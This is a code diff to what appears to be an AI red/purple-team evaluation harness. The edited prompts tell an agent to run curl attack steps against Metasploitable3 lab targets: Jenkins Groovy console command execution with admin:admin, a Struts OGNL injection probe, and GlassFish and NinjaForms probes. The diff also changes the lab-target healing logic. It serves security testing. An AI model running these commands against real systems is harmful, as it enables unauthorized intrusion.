@@ -1310,7 +1310,7 @@ SCENARIOS: dict[str, dict] = {
             "Authorized pentest: Jenkins RCE on Metasploitable3-Windows at $TARGET_HOST. "
             "Use execute_bash for each step. "
             "(1) call execute_bash with cmd='curl -s http://$TARGET_HOST:8080/login 2>&1 | head -20' to confirm Jenkins, "
-            "(2) call execute_bash with cmd='curl -s \"http://$TARGET_HOST:8080/script\" -u admin:admin -d \"script=println(\\\"id\\\".execute().text)\" 2>&1' to test Groovy script console. "
+            '(2) call execute_bash with cmd=\'curl -s "http://$TARGET_HOST:8080/script" -u admin:admin -d "script=println(\\"id\\".execute().text)" 2>&1\' to test Groovy script console. '
             "Do not describe — call the tools."
         ),
         "detect_ground_truth": ["T1190", "T1059", "T1078"],
@@ -1326,7 +1326,7 @@ SCENARIOS: dict[str, dict] = {
             "Authorized pentest: GlassFish admin console on Metasploitable3-Windows at $TARGET_HOST. "
             "Use execute_bash for each step. "
             "(1) call execute_bash with cmd='curl -s -o /dev/null -w \"%{http_code}\" http://$TARGET_HOST:4848/ 2>&1' to check GlassFish admin, "
-            "(2) call execute_bash with cmd='curl -s \"http://$TARGET_HOST:4848/management/domain/applications/application\" -H \"Accept: application/json\" 2>&1 | head -30' to enumerate apps. "
+            '(2) call execute_bash with cmd=\'curl -s "http://$TARGET_HOST:4848/management/domain/applications/application" -H "Accept: application/json" 2>&1 | head -30\' to enumerate apps. '
             "Do not describe — call the tools."
         ),
         "detect_ground_truth": ["T1190", "T1078"],
@@ -1342,7 +1342,7 @@ SCENARIOS: dict[str, dict] = {
             "Authorized pentest: Apache Struts REST showcase RCE on Metasploitable3-Windows at $TARGET_HOST. "
             "Use execute_bash for each step. "
             "(1) call execute_bash with cmd='curl -s http://$TARGET_HOST:8282/struts2-rest-showcase/ 2>&1 | head -20' to confirm Struts, "
-            "(2) call execute_bash with cmd='curl -s -H \"Content-Type: application/x-www-form-urlencoded\" -d \"redirect:http://$TARGET_HOST:8282/struts2-rest-showcase/\" http://$TARGET_HOST:8282/struts2-rest-showcase/orders/3 2>&1 | head -20' to test OGNL injection. "
+            '(2) call execute_bash with cmd=\'curl -s -H "Content-Type: application/x-www-form-urlencoded" -d "redirect:http://$TARGET_HOST:8282/struts2-rest-showcase/" http://$TARGET_HOST:8282/struts2-rest-showcase/orders/3 2>&1 | head -20\' to test OGNL injection. '
             "Do not describe — call the tools."
         ),
         "detect_ground_truth": ["T1190", "T1059"],
@@ -1486,7 +1486,7 @@ SCENARIOS: dict[str, dict] = {
             "Authorized pentest: WordPress NinjaForms exploit on Metasploitable3-Windows at $TARGET_HOST. "
             "Use execute_bash for each step. "
             "(1) call execute_bash with cmd='curl -s http://$TARGET_HOST:8585/wordpress/ 2>&1 | head -20' to confirm WordPress, "
-            "(2) call execute_bash with cmd='curl -s \"http://$TARGET_HOST:8585/wordpress/wp-admin/admin-ajax.php\" -d \"action=ninja_forms_ajax_submit\" 2>&1 | head -20' to test NinjaForms. "
+            '(2) call execute_bash with cmd=\'curl -s "http://$TARGET_HOST:8585/wordpress/wp-admin/admin-ajax.php" -d "action=ninja_forms_ajax_submit" 2>&1 | head -20\' to test NinjaForms. '
             "Do not describe — call the tools."
         ),
         "detect_ground_truth": ["T1190", "T1059"],
@@ -2860,16 +2860,33 @@ def _prepare_scenario(
     *,
     dry_run: bool = False,
     lab_exec: bool = False,
+    allow_heal: bool | None = None,
 ) -> dict:
     """Run the readiness gate, then set the scenario on cfg with resolved host/port.
 
     Returns the gate result dict: {ready, healed, host, port, reason}.
     If not ready, the caller should record indeterminate — NOT lab_success=False.
+
+    `allow_heal` controls whether the gate is allowed to actually bring a target
+    up (cmd_up / _start_lab_host) versus just passively checking reachability.
+    Defaults to `lab_exec` for backward compatibility. Found live 2026-07-05:
+    every --replay-captured-red --purple run passes lab_exec=False (correctly —
+    replay must never re-run live red), but ensure_target_ready() was ALSO being
+    called with dry_run=True as a side effect of that (dry_run or not lab_exec),
+    which silently suppressed cmd_up()/_start_lab_host() healing entirely and
+    capped the readiness poll at 20s instead of 180s for VMs. This meant a
+    target that was merely down (a crashed VM, a torn-down vulhub container)
+    was reported "target-unrecoverable" during replay even though the target
+    was in fact recoverable — replay doesn't need to re-attack, but it does
+    benefit from the target actually being reachable, and callers that pass
+    replay_captured_red=True should be able to opt into real healing without
+    changing lab_exec (which correctly stays False so red is never re-run).
     """
     try:
         from scripts.lab_targets import ensure_target_ready
 
-        gate = ensure_target_ready(scenario, dry_run=dry_run or not lab_exec)
+        heal_ok = lab_exec if allow_heal is None else allow_heal
+        gate = ensure_target_ready(scenario, dry_run=dry_run or not heal_ok)
     except Exception as exc:
         # Gate unavailable (e.g. scripts/ not importable) — proceed without it
         gate = {
